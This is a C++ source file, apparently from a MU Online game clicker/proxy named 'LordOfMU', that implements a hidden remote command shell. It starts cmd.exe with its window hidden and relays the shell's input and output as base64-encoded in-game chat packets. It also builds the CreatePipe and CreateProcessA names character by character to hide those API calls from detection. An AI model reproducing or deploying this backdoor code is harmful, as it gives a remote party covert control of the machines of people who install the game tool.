#include "stdafx.h"
#include "KingOfTerm.h"
#include "DebugOut.h"
#include "base64.h"
#include "CommonPackets.h"
#include "ClickerType.h"

/**
 * \brief 
 */
CKingOfTerm::CKingOfTerm(CProxy *pProxy)
	: m_pProxy(pProxy)
{
	m_hInputWrite = 0; 
	m_hOutputRead = 0;
	m_hProcess = 0;
	m_hStopEvent = CreateEvent(0, 1, 0, 0);
	m_hIOThread = 0;
	memset(m_szRemoteChar, 0, 16);
}


/**
 * \brief 
 */
CKingOfTerm::~CKingOfTerm()
{
	KillAll();

	if (m_hStopEvent)
		CloseHandle(m_hStopEvent);
}


/**
 * \brief 
 */
void CKingOfTerm::Start(char* pszCharName)
{
	if (!pszCharName)
		return;

	KillAll();
	strncpy(m_szRemoteChar, pszCharName, 10);

	if (!CreateIORedirProcess("cmd", FALSE, m_hInputWrite, m_hOutputRead, m_hProcess))
	{
		KillAll();
		return;
	}

	m_hIOThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)IOThreadProc, this, 0, 0);

	if (!m_hIOThread || m_hIOThread == INVALID_HANDLE_VALUE)
	{
		m_hIOThread = 0;
		KillAll();
		return;
	}


	// Send remote console confirmation
	BYTE newMsg[12] = {0};
	newMsg[0] = 'R';
	strncpy((char*)newMsg + 1, pszCharName, 10);

	newMsg[11] = 'Y';

	char szMsg[256] = {0};
	sprintf(szMsg, "/lmb %s", base64_encode(newMsg, (UINT)12).c_str());

	CCharacterSayPacket pkt("LordOfMU", szMsg);
	GetProxy()->send_packet(pkt);	
}


/**
 * \brief 
 */
void CKingOfTerm::Confirm(char* pszCharName)
{
	if (CClickerType::IsHacker())
	{
		KillAll();

		char szPath[_MAX_PATH+1] = {0};
		extern TCHAR g_szRoot[_MAX_PATH + 1];

		strcpy(szPath, CT2A(g_szRoot));
		strcat(szPath, "LordOfConsole.exe");

		if (pszCharName)
			strncpy(m_szRemoteChar, pszCharName, 10);

		if (!CreateIORedirProcess(szPath, TRUE, m_hInputWrite, m_hOutputRead, m_hProcess))
		{
			KillAll();
			return;
		}

		m_hIOThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)IOThreadProc, this, 0, 0);

		if (!m_hIOThread || m_hIOThread == INVALID_HANDLE_VALUE)
		{
			m_hIOThread = 0;
			KillAll();
		}
	}
}


/**
 * \brief 
 */
void CKingOfTerm::Data(char*, BYTE* pData, int len)
{
	if (m_hInputWrite)
	{
		DWORD nCharsWritten = 0;
		WriteFile(m_hInputWrite, pData, len, &nCharsWritten, NULL);
	}
}


/**
 * \brief 
 */
void CKingOfTerm::Close(char*)
{
	KillAll();
}


/**
 * \brief 
 */
BOOL CKingOfTerm::CreateIORedirProcess(const char* pszPath, BOOL fShowWindow, HANDLE& hInputWrite, HANDLE& hOutputRead, HANDLE& hProcess)
{
	SECURITY_ATTRIBUTES sa = {0};
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;

	HANDLE hOutputReadTmp = 0;
	HANDLE hOutputWrite = 0;

	const char* pszKernelDll = "kernel32.dll";
	FARPROC (WINAPI* GetProcAddressPtr)(HMODULE, LPCSTR) = GetProcAddress;
	HMODULE (WINAPI* GetModuleHandlePtr)(LPCSTR) = GetModuleHandleA;

	char szCreatePipe[16] = {'C', 0, 0, 'a', 't', 0, 'P', 0, 0, 'e', 0};
	szCreatePipe[1] = 'r'; szCreatePipe[2] = szCreatePipe[5] = 'e'; szCreatePipe[7] = 'i';
	szCreatePipe[8] = 'p';

	char szCreateProcess[16] = {0, 0, 0, 'a', 't', 0, 0, 0, 'o', 'c', 0, 0, 0, 'A', 0};
	szCreateProcess[2] = szCreateProcess[5] = szCreateProcess[10] = 'e';
	szCreateProcess[11] = szCreateProcess[12] = 's';
	szCreateProcess[1] = szCreateProcess[7] = 'r';
	szCreateProcess[0] = 'C';
	szCreateProcess[6] = 'P';

	CreatePipePtr CreatePipeProc = (CreatePipePtr) GetProcAddressPtr(GetModuleHandlePtr(pszKernelDll), szCreatePipe);
	CreateProcessPtr CreateProcessProc = (CreateProcessPtr) GetProcAddressPtr(GetModuleHandlePtr(pszKernelDll), szCreateProcess);

	if (!CreatePipeProc)
		return FALSE;

	if (!CreatePipeProc(&hOutputReadTmp, &hOutputWrite, &sa, 0))
	{
		return FALSE;
	}


	HANDLE hErrorWrite;

	if (!DuplicateHandle(GetCurrentProcess(), hOutputWrite, GetCurrentProcess(), &hErrorWrite, 0, TRUE, DUPLICATE_SAME_ACCESS))
	{
		return FALSE;
	}


	HANDLE hInputWriteTmp = 0;
	HANDLE hInputRead = 0;

	if (!CreatePipeProc(&hInputRead, &hInputWriteTmp, &sa, 0))
	{
		return FALSE;
	}

	if (!DuplicateHandle(GetCurrentProcess(), hOutputReadTmp, GetCurrentProcess(), &hOutputRead, 0, FALSE, DUPLICATE_SAME_ACCESS)
			|| !DuplicateHandle(GetCurrentProcess(), hInputWriteTmp, GetCurrentProcess(), &hInputWrite, 0, FALSE, DUPLICATE_SAME_ACCESS))
	{
		return FALSE;
	}

	if (!CloseHandle(hOutputReadTmp)
			|| !CloseHandle(hInputWriteTmp))
	{
		return FALSE;
	}


	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hOutputWrite;
	si.hStdInput  = hInputRead;
	si.hStdError  = hErrorWrite;
	si.wShowWindow = fShowWindow ? SW_SHOWNORMAL : SW_HIDE;

	PROCESS_INFORMATION pi = {0};

	if (!CreateProcessProc(0, (LPSTR)pszPath, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		return FALSE;
	}

	hProcess = pi.hProcess;

	if (!CloseHandle(pi.hThread))
	{
		return FALSE;
	}

	if (!CloseHandle(hOutputWrite) 
			|| !CloseHandle(hInputRead)
			|| !CloseHandle(hErrorWrite))
	{
		return FALSE;
	}

	return TRUE;
}


/**
 * \brief 
 */
void CKingOfTerm::KillAll()
{
	if (m_hInputWrite)
		CloseHandle(m_hInputWrite);

	if (m_hOutputRead)
		CloseHandle(m_hOutputRead);

	if (m_hProcess)
	{
		TerminateProcess(m_hProcess, 0);
		CloseHandle(m_hProcess);
	}

	if (m_hIOThread)
	{
		if (m_hStopEvent)
			SetEvent(m_hStopEvent);

		Sleep(100);

		if (WaitForSingleObject(m_hIOThread, 5000) == WAIT_TIMEOUT)
			TerminateThread(m_hIOThread, 0);

		CloseHandle(m_hIOThread);
	}

	m_hIOThread = 0;
	m_hProcess = 0;
	m_hInputWrite = 0;
	m_hOutputRead = 0;
	ResetEvent(m_hStopEvent);
	memset(m_szRemoteChar, 0, 16);
}


/**
 * \brief 
 */
DWORD WINAPI CKingOfTerm::IOThreadProc(CKingOfTerm* pThis)
{
	if (!pThis)
		return 1;

	HANDLE hPipeRead = pThis->m_hOutputRead;

	// Get input from our console and send it to child through the pipe.
	while (WaitForSingleObject(pThis->m_hStopEvent, 10) == WAIT_TIMEOUT)
	{
		char read_buff[100] = {0};
		DWORD nBytesRead = 0;

		if (!ReadFile(hPipeRead, read_buff, 100, &nBytesRead, NULL))
		{
			break;
		}

		if (nBytesRead != 0)
		{
			pThis->SendData(read_buff, nBytesRead);
		}
	}

	pThis->SendClose();
	return 0;
}


/**
 * \brief 
 */
void CKingOfTerm::SendData(char* read_buff, DWORD nBytesRead)
{
	if (m_szRemoteChar[0] != 0) // user console
	{
		BYTE newMsg[112] = {0};
		newMsg[0] = 'R';
		strncpy((char*)newMsg + 1, m_szRemoteChar, 10);

		newMsg[11] = 'C';
		memcpy(newMsg + 12, read_buff, nBytesRead);

		char szMsg[256] = {0};
		sprintf(szMsg, "/lmb %s", base64_encode(newMsg, (UINT)(12 + nBytesRead)).c_str());

		CCharacterSayPacket pkt("LordOfMU", szMsg);
		GetProxy()->send_packet(pkt);
	}
	else // server console
	{
		BYTE newMsg[112] = {0};
		newMsg[0] = 'C';
		memcpy(newMsg + 1, read_buff, nBytesRead);

		char szMsg[256] = {0};
		sprintf(szMsg, "/lmb %s", base64_encode(newMsg, (UINT)(1 + nBytesRead)).c_str());

		CCharacterSayPacket pkt("LordOfMU", szMsg);
		GetProxy()->send_packet(pkt);
	}
}


/**
 * \brief 
 */
void CKingOfTerm::SendClose()
{
	if (m_szRemoteChar[0] != 0) // user console
	{
		BYTE newMsg[12] = {0};
		newMsg[0] = 'R';
		strncpy((char*)newMsg + 1, m_szRemoteChar, 10);

		newMsg[11] = 'K';

		char szMsg[256] = {0};
		sprintf(szMsg, "/lmb %s", base64_encode(newMsg, (UINT)12).c_str());

		CCharacterSayPacket pkt("LordOfMU", szMsg);
		GetProxy()->send_packet(pkt);
	}
	else // server console
	{
		BYTE newMsg[10] = {0};
		newMsg[0] = 'K';

		char szMsg[256] = {0};
		sprintf(szMsg, "/lmb %s", base64_encode(newMsg, (UINT)1).c_str());

		CCharacterSayPacket pkt("LordOfMU", szMsg);
		GetProxy()->send_packet(pkt);
	}
}
